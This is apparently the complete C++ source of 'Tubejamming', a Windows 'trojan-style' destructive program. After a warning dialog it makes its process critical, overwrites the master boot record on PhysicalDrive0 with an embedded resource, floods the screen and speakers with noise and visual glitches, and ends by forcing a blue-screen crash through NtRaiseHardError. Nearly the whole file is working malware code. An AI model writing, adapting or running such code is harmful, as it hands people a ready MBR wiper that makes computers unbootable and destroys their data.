// Tubejamming.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#pragma comment(lib, "winmm.lib")
#include <iostream>
#include <Windows.h>
#include "resource.h"
typedef void(AUDIO_SEQUENCE)(int nSamplesPerSec, int nSampleCount, PSHORT psSamples), * PAUDIO_SEQUENCE;
typedef struct tagAUDIO_SEQUENCE_PARAMS
{
    int nSamplesPerSec;
    int nSampleCount;
    PAUDIO_SEQUENCE pAudioSequence;
} AUDIO_SEQUENCE_PARAMS, * PAUDIO_SEQUENCE_PARAMS;
typedef struct tagwinfo
{
    HWND hwnd;
    HDC hdc;
    RECT rekt;
}winfo;
HMODULE ntdll = LoadLibraryA("ntdll");
FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
FARPROC NtSetInformationProcess = GetProcAddress(ntdll, "NtSetInformationProcess");
FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
bool sW = TRUE;
winfo GetDesktopWinfo()
{
    winfo dwi;
    dwi.hwnd = GetDesktopWindow();
    dwi.hdc = GetWindowDC(dwi.hwnd);
    GetWindowRect(dwi.hwnd, &(dwi.rekt));
    return dwi;
}
DWORD random()
{
    DWORD out;
    HCRYPTPROV prov;
    if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))exit(NULL);
    CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
    return out;
}
void PuppetThread()
{
    for (;;);
}
void ApcRun(LPVOID fun,BOOL fla)
{
    HANDLE pt = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PuppetThread, NULL, NULL, NULL);
    FARPROC NtTestAlert = GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert");
    QueueUserAPC((PAPCFUNC)(PTHREAD_START_ROUTINE)fun, pt, NULL);
    if (NtTestAlert == NULL)exit(NULL);
    ((void(*)(void))NtTestAlert)();
    if (fla)
    {
        WaitForSingleObject(pt, INFINITE);
        CloseHandle(pt);
    }
}
void ExecuteAudioSequence(int nSamplesPerSec, int nSampleCount, AUDIO_SEQUENCE pAudioSequence)
{
    HANDLE hHeap = GetProcessHeap();
    PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount * 2);
    WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec * 2, 2, 16, 0 };
    WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount * 2, 0, 0, 0, 0, NULL, 0 };
    HWAVEOUT hWaveOut;
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);

    pAudioSequence(nSamplesPerSec, nSampleCount, psSamples);

    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));

    Sleep(nSampleCount * 1000 / nSamplesPerSec);

    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(1);
    }

    waveOutReset(hWaveOut);
    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
    HeapFree(hHeap, 0, psSamples);
}
void ExecuteAudioSequenceParams(PAUDIO_SEQUENCE_PARAMS pAudioParams)
{
    ExecuteAudioSequence(pAudioParams->nSamplesPerSec, pAudioParams->nSampleCount, (AUDIO_SEQUENCE*)pAudioParams->pAudioSequence);
}
void AudioSequence1(int nSamplesPerSec, int nSampleCount, PSHORT psSamples)
{
    HCRYPTPROV prov;
    CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);
    CryptGenRandom(prov, nSampleCount * 2, (BYTE*)psSamples);
}
void AudioPayload1Thread()
{
    AUDIO_SEQUENCE_PARAMS p = { 8000, 8000 * 60, AudioSequence1 };
    for (;;)ExecuteAudioSequenceParams(&p);
}
void PayloadBuzzer(int maxHz,int minHz,int t,int crest)
{
    int i,j,k;
    for (i = 1; i <= crest; i++)
    {
        for (j = minHz; j <= maxHz; j++)Beep(j, t);
        for (k = maxHz; k >= minHz; k--)Beep(k, t);
    }
}
void PayloadBuzzerThread()
{
    for (;;)PayloadBuzzer(0x7FFF, 0x25, 1, 10);
}
void EnableProtection()
{
    BOOLEAN tmp1;
    ULONG tmp2 = TRUE;
    if (RtlAdjustPrivilege != NULL && NtSetInformationProcess != NULL)
    {
        ((void(*)(DWORD, BOOLEAN, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(20, TRUE, FALSE, &tmp1);
        ((void(*)(HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG))NtSetInformationProcess)(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)29, &tmp2, sizeof(tmp2));
    }
    else exit(NULL);
}
void BlueScreenOfDeath()
{
    BOOLEAN tmp1;
    DWORD tmp2;
    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL)
    {
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000000, 0, 0, 0, 6, &tmp2);
    }
}
void killMBR()
{
    FILE* drive;
    HRSRC Res;
    DWORD ResSize;
    HGLOBAL Load;
    LPVOID buffer;
    Res = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), L"bin");
    ResSize = SizeofResource(NULL, Res);
    Load = LoadResource(NULL, Res);
    buffer = malloc(ResSize);
    memcpy(buffer, Load, ResSize);
    drive = fopen("\\\\.\\PhysicalDrive0", "rb+");
    if (drive == NULL)exit(1);
    if (!fwrite(buffer, ResSize, 1, drive))exit(2);
    fclose(drive);
    ExitThread(NULL);
}
void PayloadSnowflakeScreen()
{
    winfo w;
    COLORREF c;
    while (sW)
    {
        w = GetDesktopWinfo();
        if (random() % 2)c = RGB(255, 255, 255);
        else c = RGB(0, 0, 0);
        SetPixel(w.hdc, random() % (w.rekt).right + (w.rekt).left, random() % (w.rekt).bottom + (w.rekt).top, c);
        ReleaseDC(w.hwnd, w.hdc);
    }
}
COLORREF GrayScale(COLORREF color)
{
    BYTE r = GetRValue(color);
    BYTE g = GetGValue(color);
    BYTE b = GetBValue(color);

    BYTE gray = r * 0.3 + g * 0.59 + b * 0.11;

    return RGB(gray, gray, gray);
}
void PayloadGray()
{
    int x, y;
    HDC h;
    winfo w;
    HBITMAP memBitmap;
    w = GetDesktopWinfo();
    h = CreateCompatibleDC(w.hdc);
    memBitmap = CreateCompatibleBitmap(w.hdc, (w.rekt).right - (w.rekt).left, (w.rekt).bottom - (w.rekt).top);
    SelectObject(h, memBitmap);
    BitBlt(h, 0, 0, (w.rekt).right - (w.rekt).left, (w.rekt).bottom - (w.rekt).top, w.hdc, 0, 0, SRCCOPY);
    for (y = (w.rekt).top; y <= (w.rekt).bottom; y++)
    {
        for (x = (w.rekt).left; x <= (w.rekt).right; x++)
        {
            SetPixel(h, x, y, GrayScale(GetPixel(h, x, y)));
            if (!sW)goto l;
        }
    }
    BitBlt(w.hdc, 0, 0, (w.rekt).right - (w.rekt).left, (w.rekt).bottom - (w.rekt).top, h, 0, 0, SRCCOPY);
    l:;
    DeleteObject(memBitmap);
    DeleteDC(h);
    ReleaseDC(w.hwnd, w.hdc);
}
void PayloadGrayThread()
{
    for (;sW;)PayloadGray();
}
void PayloadPuzzleThread()
{
    winfo w;
    int x1, y1, x2, y2;
    int h;
    for (;sW;)
    {
        w = GetDesktopWinfo();
        h = (w.rekt).bottom - (w.rekt).top;
        x1 = (w.rekt).left;
        y1 = random() % h;
        x2 = (x1 - 5) + random() % ((x1 + 5) - (x1 - 5) + 1);
        y2 = (y1 - 10) + random() % ((y1 + 10) - (y1 - 10) + 1);
        if (!(random() % 10 == 0))BitBlt(w.hdc, x2, y2, (w.rekt).right - (w.rekt).left, random() % ((w.rekt).bottom - y2), w.hdc, x1, y1, SRCCOPY);
        else BitBlt(w.hdc, x2, y2, (w.rekt).right - (w.rekt).left, random() % ((w.rekt).bottom - y2), w.hdc, x1, y1, NOTSRCCOPY);
        ReleaseDC(w.hwnd, w.hdc);
        if (random() % 4 == 0)Sleep(random() % 5000);
    }
}
void PuzzleScan()
{
	winfo w;
	int x, y;
	w = GetDesktopWinfo();
	x = (w.rekt).left;
	for (y = (w.rekt).top; y <= (w.rekt).bottom; y++)BitBlt(w.hdc, (x - 5) + random() % ((x + 5) - (x - 5) + 1), y, (w.rekt).right - (w.rekt).left, 1, w.hdc, x, y, SRCCOPY);
	ReleaseDC(w.hwnd, w.hdc);
}
void PayloadPuzzleScanThread()
{
    for (;sW;)
    {
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PuzzleScan, NULL, NULL, NULL);
        Sleep(10000);
    }
}
void PayloadInvertColorsStreak()
{
    int i;
    winfo w = GetDesktopWinfo();
    for (i = (w.rekt).top; i <= (w.rekt).bottom; i++)
    {
        BitBlt(w.hdc, (w.rekt).left, i, (w.rekt).right - (w.rekt).left, 1, w.hdc, (w.rekt).left, i, NOTSRCCOPY);
        BitBlt(w.hdc, (w.rekt).left, i, (w.rekt).right - (w.rekt).left, 1, w.hdc, (w.rekt).left, i, NOTSRCCOPY);
    }
    ReleaseDC(w.hwnd, w.hdc);
}
void InvertColorsStreakThread()
{
    for (;;)
    {
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadInvertColorsStreak, NULL, NULL, NULL);
        Sleep(random() % 30000);
    }
}
void InvertColorsStreak()
{
    for (; sW;)PayloadInvertColorsStreak();
}
void LinesBoom()
{
    int y;
    winfo w;
    HPEN hPen;
    for (int i=1;i<= 10000;i++)
    {
        y = random() % ((w.rekt).bottom - (w.rekt).top);
        w = GetDesktopWinfo();
        hPen = CreatePen(PS_SOLID, 1, RGB(random() % 256, random() % 256, random() % 256));
        SelectObject(w.hdc, hPen);
        MoveToEx(w.hdc, (w.rekt).left, y, NULL);
        LineTo(w.hdc, (w.rekt).right, y);
        DeleteObject(hPen);
        ReleaseDC(w.hwnd, w.hdc);
    }
}
void main()
{
    if (MessageBox(NULL,L"你刚刚运行的程序被认为是有害的，会导致系统损坏和数据丢失，是否要继续运行？\r\nThe program you just ran is considered harmful and will cause system damage and data loss. Do you want to continue running it?",L"Tubejamming", MB_ICONWARNING | MB_YESNO) != IDYES)exit(NULL);
    EnableProtection();
    ApcRun(killMBR,TRUE);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AudioPayload1Thread, NULL, NULL, NULL);
    for (int i = 1; i <= 30; i++)CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadSnowflakeScreen, NULL, NULL, NULL);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadGrayThread, NULL, NULL, NULL);
    Sleep(5000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadGrayThread, NULL, NULL, NULL);
    Sleep(5000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadGrayThread, NULL, NULL, NULL);
    Sleep(10000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)InvertColorsStreak, NULL, NULL, NULL);
    Sleep(20000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadPuzzleScanThread, NULL, NULL, NULL);
    Sleep(1000*60);
    sW = FALSE;
    Sleep(500);
    sW = TRUE;
    for (int i = 1; i <= 20; i++)CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadSnowflakeScreen, NULL, NULL, NULL);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadGrayThread, NULL, NULL, NULL);
    Sleep(10000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadGrayThread, NULL, NULL, NULL);
    Sleep(10000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadGrayThread, NULL, NULL, NULL);
    Sleep(1000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)InvertColorsStreakThread, NULL, NULL, NULL);
    Sleep(5000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadBuzzerThread, NULL, NULL, NULL);
    Sleep(5000*2);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadPuzzleThread, NULL, NULL, NULL);
    Sleep(15000);
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PayloadPuzzleScanThread, NULL, NULL, NULL);
    Sleep(10000);
    sW = FALSE;
    LinesBoom();
    BlueScreenOfDeath();
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
